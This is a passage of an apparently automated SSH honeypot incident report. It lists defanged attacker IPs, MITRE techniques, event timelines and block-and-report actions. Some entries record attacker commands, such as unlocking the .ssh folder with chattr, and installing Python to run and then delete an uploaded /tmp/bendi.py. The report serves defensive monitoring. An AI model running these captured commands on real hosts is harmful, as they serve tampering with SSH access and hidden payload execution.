| `2026-08-10 02:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba03dd4879f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 02:10 |
| **Last Seen** | 2026-08-10 02:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:10:38` | `cowrie.session.connect` |
| `2026-08-10 02:10:38` | `cowrie.client.version` |
| `2026-08-10 02:10:38` | `cowrie.client.kex` |
| `2026-08-10 02:10:38` | `cowrie.login.success` |
| `2026-08-10 02:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a89af971a5b6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 02:10 |
| **Last Seen** | 2026-08-10 02:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:10:38` | `cowrie.session.connect` |
| `2026-08-10 02:10:38` | `cowrie.client.version` |
| `2026-08-10 02:10:38` | `cowrie.client.kex` |
| `2026-08-10 02:10:38` | `cowrie.login.success` |
| `2026-08-10 02:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9af9c7097b66

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 02:10 |
| **Last Seen** | 2026-08-10 02:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:10:42` | `cowrie.session.connect` |
| `2026-08-10 02:10:42` | `cowrie.client.version` |
| `2026-08-10 02:10:42` | `cowrie.client.kex` |
| `2026-08-10 02:10:42` | `cowrie.login.success` |
| `2026-08-10 02:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c4e5d41fb5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 02:10 |
| **Last Seen** | 2026-08-10 02:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:10:42` | `cowrie.session.connect` |
| `2026-08-10 02:10:42` | `cowrie.client.version` |
| `2026-08-10 02:10:42` | `cowrie.client.kex` |
| `2026-08-10 02:10:42` | `cowrie.login.success` |
| `2026-08-10 02:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9efec81b00

| Field | Detail |
|---|---|
| **Source IP** | `197.251.249[.]75` |
| **First Seen** | 2026-08-10 02:11 |
| **Last Seen** | 2026-08-10 02:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:11:10` | `cowrie.session.connect` |
| `2026-08-10 02:11:11` | `cowrie.client.version` |
| `2026-08-10 02:11:11` | `cowrie.client.kex` |
| `2026-08-10 02:11:12` | `cowrie.login.success` |
| `2026-08-10 02:11:13` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.249[.]75` to AbuseIPDB if not already reported
- [ ] Block `197.251.249[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590a9ac67d79

| Field | Detail |
|---|---|
| **Source IP** | `75.80.65[.]214` |
| **First Seen** | 2026-08-10 02:18 |
| **Last Seen** | 2026-08-10 02:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:18:26` | `cowrie.session.connect` |
| `2026-08-10 02:18:26` | `cowrie.client.version` |
| `2026-08-10 02:18:26` | `cowrie.client.kex` |
| `2026-08-10 02:18:28` | `cowrie.login.success` |
| `2026-08-10 02:18:28` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `75.80.65[.]214` to AbuseIPDB if not already reported
- [ ] Block `75.80.65[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d66ab808c96

| Field | Detail |
|---|---|
| **Source IP** | `111.46.77[.]2` |
| **First Seen** | 2026-08-10 02:18 |
| **Last Seen** | 2026-08-10 02:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:18:33` | `cowrie.session.connect` |
| `2026-08-10 02:18:34` | `cowrie.client.version` |
| `2026-08-10 02:18:34` | `cowrie.client.kex` |
| `2026-08-10 02:18:36` | `cowrie.login.success` |
| `2026-08-10 02:18:37` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.46.77[.]2` to AbuseIPDB if not already reported
- [ ] Block `111.46.77[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503bab2dfcfd

| Field | Detail |
|---|---|
| **Source IP** | `34.76.149[.]154` |
| **First Seen** | 2026-08-10 02:37 |
| **Last Seen** | 2026-08-10 02:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:37:32` | `cowrie.session.connect` |
| `2026-08-10 02:37:32` | `cowrie.client.version` |
| `2026-08-10 02:37:32` | `cowrie.client.kex` |
| `2026-08-10 02:37:34` | `cowrie.login.success` |
| `2026-08-10 02:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.149[.]154` to AbuseIPDB if not already reported
- [ ] Block `34.76.149[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db31eed45b1

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-08-10 02:43 |
| **Last Seen** | 2026-08-10 02:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:43:34` | `cowrie.session.connect` |
| `2026-08-10 02:43:35` | `cowrie.client.version` |
| `2026-08-10 02:43:35` | `cowrie.client.kex` |
| `2026-08-10 02:43:36` | `cowrie.login.success` |
| `2026-08-10 02:43:37` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-527616d7784e

| Field | Detail |
|---|---|
| **Source IP** | `94.228.240[.]2` |
| **First Seen** | 2026-08-10 02:43 |
| **Last Seen** | 2026-08-10 02:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:43:42` | `cowrie.session.connect` |
| `2026-08-10 02:43:42` | `cowrie.client.version` |
| `2026-08-10 02:43:42` | `cowrie.client.kex` |
| `2026-08-10 02:43:43` | `cowrie.login.success` |
| `2026-08-10 02:43:43` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.228.240[.]2` to AbuseIPDB if not already reported
- [ ] Block `94.228.240[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90df3809b55c

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:09` | `cowrie.session.connect` |
| `2026-08-10 02:45:09` | `cowrie.client.version` |
| `2026-08-10 02:45:10` | `cowrie.client.kex` |
| `2026-08-10 02:45:11` | `cowrie.login.success` |
| `2026-08-10 02:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60c880c8fc8

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:10` | `cowrie.session.connect` |
| `2026-08-10 02:45:10` | `cowrie.client.version` |
| `2026-08-10 02:45:10` | `cowrie.client.kex` |
| `2026-08-10 02:45:11` | `cowrie.login.success` |
| `2026-08-10 02:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a6468e4bdf

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:15` | `cowrie.session.connect` |
| `2026-08-10 02:45:15` | `cowrie.client.version` |
| `2026-08-10 02:45:15` | `cowrie.client.kex` |
| `2026-08-10 02:45:16` | `cowrie.login.success` |
| `2026-08-10 02:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-055fffbf3688

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:17` | `cowrie.session.connect` |
| `2026-08-10 02:45:17` | `cowrie.client.version` |
| `2026-08-10 02:45:17` | `cowrie.client.kex` |
| `2026-08-10 02:45:18` | `cowrie.login.success` |
| `2026-08-10 02:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25bb6682e78

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:24` | `cowrie.session.connect` |
| `2026-08-10 02:45:25` | `cowrie.client.version` |
| `2026-08-10 02:45:25` | `cowrie.client.kex` |
| `2026-08-10 02:45:27` | `cowrie.login.success` |
| `2026-08-10 02:45:28` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4802faa190bc

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-10 02:45 |
| **Last Seen** | 2026-08-10 02:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:45:33` | `cowrie.session.connect` |
| `2026-08-10 02:45:34` | `cowrie.client.version` |
| `2026-08-10 02:45:34` | `cowrie.client.kex` |
| `2026-08-10 02:45:36` | `cowrie.login.success` |
| `2026-08-10 02:45:36` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6134834c3ec9

| Field | Detail |
|---|---|
| **Source IP** | `42.240.164[.]208` |
| **First Seen** | 2026-08-10 02:50 |
| **Last Seen** | 2026-08-10 02:55 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:50:06` | `cowrie.session.connect` |
| `2026-08-10 02:50:06` | `cowrie.client.version` |
| `2026-08-10 02:50:06` | `cowrie.client.kex` |
| `2026-08-10 02:50:07` | `cowrie.login.success` |
| `2026-08-10 02:50:08` | `cowrie.session.params` |
| `2026-08-10 02:50:08` | `cowrie.command.input` |
| `2026-08-10 02:50:08` | `cowrie.command.failed` |
| `2026-08-10 02:50:08` | `cowrie.log.closed` |
| `2026-08-10 02:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.240.164[.]208` to AbuseIPDB if not already reported
- [ ] Block `42.240.164[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428a91b85d4b

| Field | Detail |
|---|---|
| **Source IP** | `42.240.164[.]208` |
| **First Seen** | 2026-08-10 02:50 |
| **Last Seen** | 2026-08-10 02:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:50:23` | `cowrie.session.connect` |
| `2026-08-10 02:50:23` | `cowrie.client.version` |
| `2026-08-10 02:50:23` | `cowrie.client.kex` |
| `2026-08-10 02:50:24` | `cowrie.login.success` |
| `2026-08-10 02:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.240.164[.]208` to AbuseIPDB if not already reported
- [ ] Block `42.240.164[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fcfa755fc50

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-08-10 02:50 |
| **Last Seen** | 2026-08-10 02:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:50:45` | `cowrie.session.connect` |
| `2026-08-10 02:50:46` | `cowrie.client.version` |
| `2026-08-10 02:50:46` | `cowrie.client.kex` |
| `2026-08-10 02:50:47` | `cowrie.login.success` |
| `2026-08-10 02:50:48` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b505874f42f8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.158[.]10` |
| **First Seen** | 2026-08-10 02:50 |
| **Last Seen** | 2026-08-10 02:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:50:52` | `cowrie.session.connect` |
| `2026-08-10 02:50:53` | `cowrie.client.version` |
| `2026-08-10 02:50:53` | `cowrie.client.kex` |
| `2026-08-10 02:50:54` | `cowrie.login.success` |
| `2026-08-10 02:50:54` | `cowrie.direct-tcpip.request` |
| `2026-08-10 02:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.158[.]10` to AbuseIPDB if not already reported
- [ ] Block `65.20.158[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-280febe0f7a8

| Field | Detail |
|---|---|
| **Source IP** | `207.175.155[.]36` |
| **First Seen** | 2026-08-10 03:11 |
| **Last Seen** | 2026-08-10 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:11:23` | `cowrie.session.connect` |
| `2026-08-10 03:11:23` | `cowrie.login.success` |
| `2026-08-10 03:11:23` | `cowrie.session.params` |
| `2026-08-10 03:11:23` | `cowrie.command.input` |
| `2026-08-10 03:11:23` | `cowrie.command.input` |
| `2026-08-10 03:11:23` | `cowrie.command.failed` |
| `2026-08-10 03:11:23` | `cowrie.command.input` |
| `2026-08-10 03:11:23` | `cowrie.log.closed` |
| `2026-08-10 03:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.155[.]36` to AbuseIPDB if not already reported
- [ ] Block `207.175.155[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0727252a1963

| Field | Detail |
|---|---|
| **Source IP** | `207.175.155[.]36` |
| **First Seen** | 2026-08-10 03:11 |
| **Last Seen** | 2026-08-10 03:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:11:31` | `cowrie.session.connect` |
| `2026-08-10 03:11:31` | `cowrie.login.success` |
| `2026-08-10 03:11:32` | `cowrie.session.params` |
| `2026-08-10 03:11:32` | `cowrie.command.input` |
| `2026-08-10 03:11:32` | `cowrie.command.failed` |
| `2026-08-10 03:11:35` | `cowrie.log.closed` |
| `2026-08-10 03:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.155[.]36` to AbuseIPDB if not already reported
- [ ] Block `207.175.155[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa7957d8657c

| Field | Detail |
|---|---|
| **Source IP** | `207.175.155[.]36` |
| **First Seen** | 2026-08-10 03:11 |
| **Last Seen** | 2026-08-10 03:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:11:33` | `cowrie.session.connect` |
| `2026-08-10 03:11:33` | `cowrie.login.success` |
| `2026-08-10 03:11:34` | `cowrie.session.params` |
| `2026-08-10 03:11:34` | `cowrie.command.input` |
| `2026-08-10 03:11:35` | `cowrie.log.closed` |
| `2026-08-10 03:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.155[.]36` to AbuseIPDB if not already reported
- [ ] Block `207.175.155[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a27f54cd339

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-10 03:12 |
| **Last Seen** | 2026-08-10 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:12:58` | `cowrie.session.connect` |
| `2026-08-10 03:12:58` | `cowrie.client.version` |
| `2026-08-10 03:12:58` | `cowrie.client.kex` |
| `2026-08-10 03:12:59` | `cowrie.login.success` |
| `2026-08-10 03:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afcdc893f997

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-10 03:13 |
| **Last Seen** | 2026-08-10 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:13:00` | `cowrie.session.connect` |
| `2026-08-10 03:13:00` | `cowrie.client.version` |
| `2026-08-10 03:13:00` | `cowrie.client.kex` |
| `2026-08-10 03:13:01` | `cowrie.login.success` |
| `2026-08-10 03:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cd76e06385f

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-10 03:13 |
| **Last Seen** | 2026-08-10 03:15 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:13:23` | `cowrie.session.connect` |
| `2026-08-10 03:13:23` | `cowrie.client.version` |
| `2026-08-10 03:13:23` | `cowrie.client.kex` |
| `2026-08-10 03:13:24` | `cowrie.login.success` |
| `2026-08-10 03:13:26` | `cowrie.session.file_upload` |
| `2026-08-10 03:13:27` | `cowrie.session.params` |
| `2026-08-10 03:13:27` | `cowrie.command.input` |
| `2026-08-10 03:13:27` | `cowrie.command.input` |
| `2026-08-10 03:13:27` | `cowrie.command.input` |
| `2026-08-10 03:13:27` | `cowrie.command.failed` |
| `2026-08-10 03:13:27` | `cowrie.log.closed` |
| `2026-08-10 03:13:28` | `cowrie.session.params` |
| `2026-08-10 03:13:28` | `cowrie.command.input` |
| `2026-08-10 03:13:28` | `cowrie.log.closed` |
| `2026-08-10 03:13:29` | `cowrie.session.params` |
| `2026-08-10 03:13:29` | `cowrie.command.input` |
| `2026-08-10 03:13:30` | `cowrie.log.closed` |
| `2026-08-10 03:13:31` | `cowrie.session.params` |
| `2026-08-10 03:13:31` | `cowrie.command.input` |
| `2026-08-10 03:13:31` | `cowrie.command.failed` |
| `2026-08-10 03:13:31` | `cowrie.command.failed` |
| `2026-08-10 03:14:32` | `cowrie.session.params` |
| `2026-08-10 03:14:32` | `cowrie.command.input` |
| `2026-08-10 03:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbfa3e14cbb

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-10 03:15 |
| **Last Seen** | 2026-08-10 03:17 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:15:48` | `cowrie.session.connect` |
| `2026-08-10 03:15:48` | `cowrie.client.version` |
| `2026-08-10 03:15:49` | `cowrie.client.kex` |
| `2026-08-10 03:15:49` | `cowrie.login.success` |
| `2026-08-10 03:15:51` | `cowrie.session.file_upload` |
| `2026-08-10 03:15:53` | `cowrie.session.params` |
| `2026-08-10 03:15:53` | `cowrie.command.input` |
| `2026-08-10 03:15:53` | `cowrie.command.input` |
| `2026-08-10 03:15:53` | `cowrie.command.input` |
